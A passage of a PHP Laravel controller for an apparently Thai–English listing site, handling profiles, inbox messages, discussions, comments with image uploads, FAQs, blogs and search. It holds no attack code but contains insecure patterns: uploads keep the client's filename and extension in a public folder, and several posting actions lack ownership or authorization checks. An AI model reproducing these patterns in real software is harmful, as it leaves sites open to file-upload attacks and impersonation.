                $obj_users         = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->where('status', '1')->orderBy('created_at', 'desc')->paginate(30);
                // dd($obj_users->toArray());
                if ($obj_users) {
                    $arr_users     = $obj_users->toArray();
                }

                $arr_user2   = '';
                $obj_user2   = $this->BaseModel->where('id', $user->id)->first();
                if ($obj_user2) {
                    $arr_user2      = $obj_user2->toArray();
                }
                //dd($arr_user2);
                //dd($arr_user);
                $this->arr_view_data['arr_user']                        = $arr_user;
                $this->arr_view_data['arr_users']                       = $arr_users['data'];
                $this->arr_view_data['obj_users']                       = $obj_users;
                $this->arr_view_data['badges_point']                    = $arr_user2['badges_point'];
                $this->arr_view_data['badges_system_id']                = $arr_user2['badges_system_id'];
                $this->arr_view_data['user_id']                         = $arr_user2['id'];
                $this->arr_view_data['badges_th'] = FaqsModel::OrderBy('created_at', 'ASC')->where('type', 2)->where('lang', 1)->get();
                $this->arr_view_data['badges_en'] = FaqsModel::OrderBy('created_at', 'ASC')->where('type', 2)->where('lang', 2)->get();


                $settings = SiteSettingModel::find(1);
                $ismessage = true;
                return view('front.new.profile', $this->arr_view_data, compact('settings', 'user', 'ismessage'));
            }
        }
        abort(404);
    }

    public function inbox()
    {

        $userid = session('user_id');
        if (!empty($userid)) {
            $user = UserModel::find($userid);
            if (!empty($user)) {
                $arr_user   = '';
                $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
                if ($obj_user) {
                    $arr_user      = $obj_user->toArray();
                }
                $obj_users         = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->where('status', '1')->orderBy('created_at', 'desc')->paginate(30);
                // dd($obj_users->toArray());
                if ($obj_users) {
                    $arr_users     = $obj_users->toArray();
                }
                $this->arr_view_data['arr_user']                        = $arr_user;
                $this->arr_view_data['arr_users']                       = $arr_users['data'];
                $this->arr_view_data['obj_users']                       = $obj_users;

                $this->arr_view_data['badges'] = FaqsModel::OrderBy('created_at', 'ASC')->where('type', 2)->where('lang', 2)->get();

                $settings = SiteSettingModel::find(1);
                $inboxes = InboxModel::OrderBy('created_at', 'DESC')->Orwhere('user_id', $userid)->Orwhere('revice_user_id', $userid)->get();

                $inboxselected = $inboxes->first();



                return view('front.new.inbox', $this->arr_view_data, compact('inboxes', 'user', 'settings', 'inboxselected'));
            }
        }

        return redirect('/');
    }

    public function selectedinbox($inboxselected)
    {

        $userid = session('user_id');
        if (!empty($userid)) {
            $user = UserModel::find($userid);
            if (!empty($user)) {

                $inboxselected = InboxModel::OrderBy('created_at', 'DESC')->where('id', $inboxselected)->where('user_id', $userid)->first();

                if (!empty($inboxselected)) {
                    $arr_user   = '';
                    $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
                    if ($obj_user) {
                        $arr_user      = $obj_user->toArray();
                    }
                    $obj_users         = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->where('status', '1')->orderBy('created_at', 'desc')->paginate(30);
                    // dd($obj_users->toArray());
                    if ($obj_users) {
                        $arr_users     = $obj_users->toArray();
                    }
                    $this->arr_view_data['arr_user']                        = $arr_user;
                    $this->arr_view_data['arr_users']                       = $arr_users['data'];
                    $this->arr_view_data['obj_users']                       = $obj_users;
                    $this->arr_view_data['badges'] = FaqsModel::OrderBy('created_at', 'ASC')->where('type', 2)->where('lang', 2)->get();



                    $settings = SiteSettingModel::find(1);
                    $inboxes = InboxModel::OrderBy('created_at', 'DESC')->Orwhere('user_id', $userid)->Orwhere('revice_user_id', $userid)->get();


                    return view(
                        'front.new.inbox',
                        $this->arr_view_data,
                        compact('inboxes', 'user', 'settings', 'inboxselected')
                    );
                }
            }
        }

        abort(404);
    }

    public function myprofile()
    {
        $userid = session('user_id');
        if (!empty($userid)) {
            $user = UserModel::find($userid);
            if (!empty($user)) {
                $arr_user   = '';
                $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
                if ($obj_user) {
                    $arr_user      = $obj_user->toArray();
                }
                $obj_users         = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->where('status', '1')->orderBy('created_at', 'desc')->paginate(30);
                // dd($obj_users->toArray());
                if ($obj_users) {
                    $arr_users     = $obj_users->toArray();
                }
                $this->arr_view_data['arr_user']                        = $arr_user;
                $this->arr_view_data['arr_users']                       = $arr_users['data'];
                $this->arr_view_data['obj_users']                       = $obj_users;
                $this->arr_view_data['badges_th'] = FaqsModel::OrderBy('created_at', 'ASC')->where('type', 2)->where('lang', 1)->get();
                $this->arr_view_data['badges_en'] = FaqsModel::OrderBy('created_at', 'ASC')->where('type', 2)->where('lang', 2)->get();

                $settings = SiteSettingModel::find(1);
                $ismessage = false;
                return view('front.new.profile', $this->arr_view_data, compact('settings', 'user', 'ismessage'));
            }
        }
        abort(404);
    }

    public function sendmessage(UserModel $user, Request $request)
    {
        if (!empty($user)) {
            $user_id = session('user_id');


            $arr_rules['message']               = "required";
            $validator = validator::make($request->all(), $arr_rules);
            if ($validator->fails()) {
                return redirect()->back()->withErrors($validator)->withInput();
            }

            $inboxmodel = InboxModel::Orwhere('user_id', $user_id)->Orwhere('revice_user_id', $user->id)->first();

            if (empty($inboxmodel)) {
                InboxModel::create([
                    'user_id' => $user_id,
                    'revice_user_id' => $user->id,
                    'message' => $request->get('message')
                ]);
            }


            MessageModel::create([
                'user_id' => $user_id,
                'receive_id' => $user->id,
                'message' => $request->get('message')
            ]);



            Session::flash('success', 'Your message has been successfully sent');
            return back();
        }
        abort(404);
    }

    public function savediscuss(UserModel $user, Request $request)
    {
        if (!empty($user)) {

            $arr_rules['title']               = "required";
            $arr_rules['description']               = "required";
            $validator = validator::make($request->all(), $arr_rules);
            if ($validator->fails()) {
                return redirect()->back()->withErrors($validator)->withInput();
            }

            $type = $request->get('type');

            if (empty($type)) {
                $type = 2;
            }

            DiscussModel::create([
                'title' => $request->get('title'),
                'type' => $type,
                'description' => $request->get('description'),
                'user_id' => $user->id
            ]);

            if (!empty($user)) {
                $user->update(['rank' => $user->rank + 1]);
            }


            Session::flash('success', 'Your message has been successfully sent');
            return back();
        }
        abort(404);
    }

    public function thread(DiscussModel $discuss)
    {
        $threads = ThreadModel::where('discuss_id', $discuss->id)->paginate(10);
        $settings = SiteSettingModel::find(1);
        $user = session('user_id');
        $user = UserModel::find($user);

        $settings = SiteSettingModel::find(1);
        $arr_user   = '';
        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            $arr_user      = $obj_user->toArray();
        }
        $obj_users         = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->where('status', '1')->orderBy('created_at', 'desc')->paginate(30);
        // dd($obj_users->toArray());
        if ($obj_users) {
            $arr_users     = $obj_users->toArray();
        }
        $this->arr_view_data['arr_user']                        = $arr_user;
        $this->arr_view_data['arr_users']                       = $arr_users['data'];
        $this->arr_view_data['obj_users']                       = $obj_users;

        return view('front.index.theards', $this->arr_view_data, compact('threads', 'discuss', 'settings', 'user'));
    }


    public function savethread(UserModel $user, DiscussModel $discuss, Request $request)
    {
        if (!empty($user)) {

            $arr_rules['title']               = "required";
            $arr_rules['description']               = "required";
            $validator = validator::make($request->all(), $arr_rules);
            if ($validator->fails()) {
                return redirect()->back()->withErrors($validator)->withInput();
            }

            $type = $request->get('type');

            if (empty($type)) {
                $type = 2;
            }

            ThreadModel::create([
                'title' => $request->get('title'),
                'type' => $type,
                'comment' => $request->get('description'),
                'user_id' => $user->id,
                'discuss_id' => $discuss->id
            ]);

            if (!empty($user)) {
                $user->update(['rank' => $user->rank + 1]);
            }


            Session::flash('success', 'Your message has been successfully sent');
            return back();
        }
        abort(404);
    }

    public function comment(Request $request)
    {

        $user = Auth::user();
        $user_id = session('user_id');

        $commentsuser = CommentsModel::where('user_id', $user_id)->OrderBy('created_at', 'DESC')->first();

        if (!empty($commentsuser)) {

            $commentdate = new \Carbon\Carbon($commentsuser->created_at);
            $now  = \Carbon\Carbon::now();

            $diff_in_minutes =  $commentdate->diffInSeconds($now);

            if ($diff_in_minutes <= 20) {
                Session::flash('error', 'Please wait 20 seconds before you send your comment');

                return back();
            }
        }


        // dd($request->all());
        $arr_rules      = $arr_data = array();
        $status         = false;

        $arr_rules['comment']               = "required";
        $arr_rules['model_id']              = "required";
        $arr_rules['user_id']               = "required";

        $validator = validator::make($request->all(), $arr_rules);
        if ($validator->fails()) {
            return redirect()->back()->withErrors($validator)->withInput();
        }

        $arr_data['comment']                = $request->input('comment', null);
        $arr_data['model_id']               = $request->input('model_id', null);
        $arr_data['user_id']                = $request->input('user_id', null);
        $arr_data['model_user_id']          = session('user_id');

        $useridcomment = $request->get('usercomment');

        if (!empty($request->get('usercomment'))) {

            $userid = session('user_id');

            $data = explode(',', $useridcomment);


            $image = null;
            if ($request->hasFile('image') && $request->file('image')->isValid()) {
                $image = $this->uploadFile('uploads/comments/', $request->file('image'));

                $img = \Image::make($image);

                $img->resize(null, 300, function ($constraint) {
                    $constraint->aspectRatio();
                })->save();
            }

            CommentModelsModel::create([
                'user_id' => $userid,
                'replay_user_id' => $data[0],
                'comment_id' => $data[1],
                'model_id' => $request->input('model_id', null),
                'comment' => $request->input('comment', null),
                'image' => $image
            ]);


            $finduser = UserModel::find(session('user_id'));
            if (!empty($finduser)) {
                $finduser->update(['rank' => $finduser->rank + 1]);
            }

            return redirect()->back();
        } else {
            $finduser = UserModel::find(session('user_id'));
            if (!empty($finduser)) {
                $finduser->update(['rank' => $finduser->rank + 1]);
            }

            $image = null;
            if ($request->hasFile('image') && $request->file('image')->isValid()) {
                $image = $this->uploadFile('uploads/comments/', $request->file('image'));

                $img = \Image::make($image);

                $img->resize(null, 300, function ($constraint) {
                    $constraint->aspectRatio();
                })->save();
            }

            $arr_data['image'] = $image;

            $user = $this->CommentsModel->create($arr_data);
        }

        if ($user) {
            return redirect()->back();
        }
    }

    function uploadFile($directory, $file)
    {
        try {
            $filename = $this->generateFileExist($directory, $file);
            $file->move($directory, $filename);
            return $directory . $filename;
        } catch (Exception $e) {
            Log::error($e->getMessage());
        }
    }

    function generateFileExist($directory, $file)
    {
        $israndom = false;
        if (\File::exists($directory . '/' . $file->getClientOriginalName())) {
            $israndom = true;
        }

        if ($israndom) {
            $newfilename = pathinfo($file->getClientOriginalName(), PATHINFO_FILENAME);
            $extension   = pathinfo($file->getClientOriginalName(), PATHINFO_EXTENSION);
            return $newfilename . mt_rand() . '.' . $extension;
        }
        return $file->getClientOriginalName();
    }

    public function logout()
    {
        $this->auth->logout();
        Session::flush();
        Session::flash('success', str_singular('logout successfully.'));
        return redirect(url('/'));
    }

    public function advertise()
    {
        $settings = SiteSettingModel::find(1);
        return view('front.index.advertise', compact('settings'));
    }


    public function faqs()
    {
        Session::put('applocale', "th");
        session(['locale' => "th"]);
        app()->setLocale("th");
        $faqs = FaqsModel::OrderBy('created_at', 'DESC')->where('type', 1)->where('lang', 1)->get();
        $settings = SiteSettingModel::find(1);
        return view('front.new.faq', compact('faqs', 'settings'));
    }

    public function faqsbadges()
    {
        Session::put('applocale', "th");
        session(['locale' => "th"]);
        app()->setLocale("th");
        $faqs = FaqsModel::OrderBy('created_at', 'DESC')->where('type', 2)->where('lang', 1)->get();
        $settings = SiteSettingModel::find(1);
        return view('front.new.faqs_ranks', compact('faqs', 'settings'));
    }

    public function enfaqsbadges()
    {
        Session::put('applocale', "en");
        session(['locale' => "en"]);
        app()->setLocale("en");
        $faqs = FaqsModel::OrderBy('created_at', 'DESC')->where('type', 2)->where('lang', 2)->get();
        $settings = SiteSettingModel::find(1);
        return view('front.new.faqs_ranks', compact('faqs', 'settings'));
    }

    public function enfaq()
    {
        Session::put('applocale', "en");
        session(['locale' => "en"]);
        app()->setLocale("en");
        $faqs = FaqsModel::OrderBy('created_at', 'DESC')->where('type', 1)->where('lang', 2)->get();
        $settings = SiteSettingModel::find(1);
        return view('front.new.faq', compact('faqs', 'settings'));
    }

    public function blogs()
    {
        $settings = SiteSettingModel::find(1);
        if ($settings->hideblog == 1) {
            Session::put('applocale', "th");
            session(['locale' => "th"]);
            app()->setLocale("th");
            $blogs = BlogsModel::OrderBy('created_at', 'DESC')->where('lang', 1)->paginate(10);
            return view('front.index.blogs', compact('blogs'));
        }
        abort(404);
    }


    public function page($id)
    {
        $id = base64_decode($id);
        $page = PageModel::OrderBy('created_at', 'DESC')->where('id', $id)->first();
        $settings = SiteSettingModel::find(1);
        return view('front.new.page', compact('page', 'settings'));
        abort(404);
    }

    public function blogsen()
    {
        $settings = SiteSettingModel::find(1);
        if ($settings->hideblog == 1) {
            Session::put('applocale', "en");
            session(['locale' => "en"]);
            app()->setLocale("en");
            $blogs = BlogsModel::OrderBy('created_at', 'DESC')->where('lang', 2)->paginate(10);
            return view('front.index.blogs', compact('blogs'));
            return view('front.index.blogs', compact('blogs'));
        }
        abort(404);
    }

    public function blog($slug)
    {
        $settings = SiteSettingModel::find(1);
        if ($settings->hideblog == 1) {
            $blog =  BlogsModel::where('slug', $slug)->first();
            if (!empty($blog)) {
                return view('front.index.blog', compact('blog'));
            }
        }
        abort(404);
    }

    public function contactus()
    {

        // $models = ModelsModel::OrderBy('created_at','DESC')->with('get_images')->get();


        // foreach($models as $model)
        // {
        //     foreach($model->get_images as $image)
        //     {


        //         $watermark = \Image::make("assets/watermark.png");

        //         try
        //         {
        //             $img = \Image::make("uploads/models/profile_image/286-319/".$image->profile_image);

        //             $img->insert($watermark, 'center');

        //             $img->save();
        //         }
        //         catch(\Exception $e)
        //         {
        //             \Log::error("uploads/models/profile_image/286-319/".$image->profile_image);
        //         }

        //         try
        //         {

        //             $img2 = \Image::make("uploads/models/profile_image/434-651/".$image->profile_image);

        //             $img2->insert($watermark, 'center');

        //             $img2->save();
        //         }
        //         catch(\Exception $e)
        //         {
        //             \Log::error("uploads/models/profile_image/434-651/".$image->profile_image);
        //         }


        //         try
        //         {
        //             $img3 = \Image::make("uploads/models/profile_image/".$image->profile_image);

        //             $img3->insert($watermark, 'center');

        //             $img3->save();
        //         }
        //         catch(\Exception $e)
        //         {
        //             \Log::error("uploads/models/profile_image/".$image->profile_image);
        //         }

        //     }
        // }

        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        if ($obj_user) {
            $arr_user      = $obj_user->toArray();
        }


        $settings = SiteSettingModel::find(1);
        return view('front.new.contactus', compact('settings'));
    }

    public function sendcontactus(Request $request)
    {

        $arr_rules      = array();

        $arr_rules['name']     = "required";
        $arr_rules['email']  = "required";
        $arr_rules['comment']  = "required";

        $validator = Validator::make($request->all(), $arr_rules);

        if ($validator->fails()) {
            return back()->withErrors($validator)->withInput();
        }


        $subject = "ContactUs";
        $to = "supports@www.soi66.com";
        \Mail::send('emails.contactus', [
            'to' => $to, 'subject' => $subject,
            'bodymessage' => $request->comment,
            'name' => $request->name,
            'email' => $request->email,
            'phone' => $request->phone
        ], function ($m) use ($to, $subject) {
            $m->to($to, "Soi66")->subject($subject);
        });


        Session::flash('success', 'Your message has been successfully sent');
        return back();
    }

    public function MailMessage($to, $fullname, $subject, $message)
    {
        $subject = $subject;
        \Mail::send('emails.message', ['to' => $to, 'fullname' => $fullname, 'subject' => $subject, 'bodymessage' => $message], function ($m) use ($to, $subject) {
            $m->to($to, "Soi66")->subject($subject);
        });
    }

    public function MailMessageRegister($to, $fullname, $subject)
    {
        $subject = $subject;
        \Mail::send('emails.register', ['to' => $to, 'fullname' => $fullname, 'subject' => $subject, 'email' => $to], function ($m) use ($to, $subject) {
            $m->to($to, "Soi66")->subject($subject);
        });
    }

    public function area()
    {
        $obj_area_data = $this->AreaModel
            ->where('status', '1')
            ->orderBy('created_at', 'DESC')
            ->paginate(20);

        if (isset($obj_area_data)) {
            $arr_data_area = $obj_area_data->toArray();

            $this->arr_view_data['front_url_path']                  = $this->front_url_path;
            $this->arr_view_data['front_panel_slug']                = $this->front_panel_slug;
            $this->arr_view_data['arr_users']                       = $arr_data_area['data'];
            $this->arr_view_data['obj_users']                       = $obj_area_data;

            $settings = SiteSettingModel::find(1);
            return view('front.new.area', $this->arr_view_data, compact('settings'));
        }
    }

    public function search($type, $search_text)
    {


        $arr_user   = '';
        $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
        $obj_users_count = 0;
        if ($obj_user) {
            $arr_user      = $obj_user->toArray();
        }

        if ($type == 'area') {
            $area_id = base64_decode($search_text);
            $obj_area_data = $this->AreaModel
                ->where('id', $area_id)
                ->orderBy('created_at', 'DESC')
                ->get();

            if (isset($obj_area_data)) {
                $arr_data_area = $obj_area_data->toArray();
                $arr_data_area = array_shift($arr_data_area);

                $arr_data_area['locations'] = str_replace('"', '', $arr_data_area['locations']);

                $obj_locations = $this->LocationModel->where('status', '=', "1")->whereIn('id', json_decode($arr_data_area['locations']));
                $json_location_result = DataTables::of($obj_locations)->make(true);
                $build_location_result = $json_location_result->getData();

                $array_location_id_search = [];
                $array_location_name = [];
                if (isset($build_location_result->data)) {
                    foreach ($build_location_result->data as $data) {
                        $location_id = '"' . $data->id . '"';
                        $array_location_name[] = $data->location_name;
                        $array_location_name_th[] = $data->location_name_th;
                        $array_location_id_search[] = $location_id;
                    }
                }
                $location_all_name = implode(", ", $array_location_name);
                $location_all_name_th = implode(", ", $array_location_name_th);

                $obj_users = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->where('status', '1')->Where(
                    function ($query) use ($array_location_id_search) {
                        foreach ($array_location_id_search as $id) {
                            $query->orwhere('locations', 'like', '%' . $id . '%');
                        }
                    }
                )->orderBy('order_list', 'DESC')->paginate(40);

                $obj_users_count = $this->ModelsModel->with('get_images', 'get_category', 'get_companies')->where('status', '1')->Where(
                    function ($query) use ($array_location_id_search) {
                        foreach ($array_location_id_search as $id) {
                            $query->orwhere('locations', 'like', '%' . $id . '%');
                        }
                    }
                )->orderBy('order_list', 'DESC')->count();
                $message = isset($arr_data_area) ? $arr_data_area['area_name'] . ': ' . $location_all_name : '';
                $message_th = isset($arr_data_area) ? $arr_data_area['area_name_th'] . ': ' . $location_all_name_th : '';
            }
        } else if ($type == 'company') {
            $company_id = base64_decode($search_text);

            $arr_user   = '';
            $obj_banner     = $this->BannersModel->where('status', '=', '1')
                ->orderBy('created_at', 'desc')
                ->get();
            if ($obj_banner) {
                $arr_banner   = $obj_banner->toArray();
            }
            $obj_user   = $this->BaseModel->where('id', session('user_id'))->first();
            if ($obj_user) {
                $arr_user   = $obj_user->toArray();
            }
            $obj_users   = $this->ModelsModel->with('get_images', 'get_category')
                ->where('company', '=', $company_id)
                ->where('status', '1')
                ->with('get_companies')
                ->orderBy('order_list', 'DESC')
                ->paginate(40);

            $obj_users_count = $this->ModelsModel->with('get_images', 'get_category')
                ->where('company', '=', $company_id)
                ->where('status', '1')
                ->with('get_companies')
                ->orderBy('order_list', 'DESC')->count();
            $company = CompaniesModel::find($company_id);
            $message = $company->company_name;
        } else if ($type == 'name') {
            $name = base64_decode($search_text);


            $obj_users   = $this->ModelsModel->with('get_images', 'get_category')
                ->where('first_name', 'like', '%' . $name . '%')
                ->where('status', '1')
                ->with('get_companies')
                ->orderBy('order_list', 'DESC')
                ->paginate(40);

            $obj_users_count = $this->ModelsModel->with('get_images', 'get_category')
                ->where('first_name', 'like', '%' . $name . '%')
                ->where('status', '1')
                ->with('get_companies')
                ->orderBy('order_list', 'DESC')->count();
            $message = $name;
        }


        if ($obj_users) {
            $arr_users     = $obj_users->toArray();
        }

        $this->arr_view_data['front_url_path']                  = $this->front_url_path;
        $this->arr_view_data['front_panel_slug']                = $this->front_panel_slug;
        $this->arr_view_data['arr_user']                        = $arr_user;
        $this->arr_view_data['arr_users']                       = $arr_users['data'];
        $this->arr_view_data['obj_users']                       = $obj_users;

        $this->arr_view_data['search_result']                       = [
            'searchBy' => $type,
            'searchText' => $message,
            'searchText_th' => $message_th,
            'total' => $obj_users_count
        ];

        $this->arr_view_data['base_img_path']                   = $this->user_profile_image_base_img_path;
        $this->arr_view_data['base_img_public_path']            = $this->user_profile_image_public_img_path;

        $this->arr_view_data['thumb_286_319_base_img_path']     = $this->thumb_286_319_base_img_path;
        $this->arr_view_data['thumb_286_319_public_img_path']   = $this->thumb_286_319_public_img_path;

        $this->arr_view_data['thumb_434_651_base_img_path']     = $this->thumb_434_651_base_img_path;
        $this->arr_view_data['thumb_434_651_public_img_path']   = $this->thumb_434_651_public_img_path;

        $settings = SiteSettingModel::find(1);
        return view('front.new.search', $this->arr_view_data, compact('settings'));
    }
}
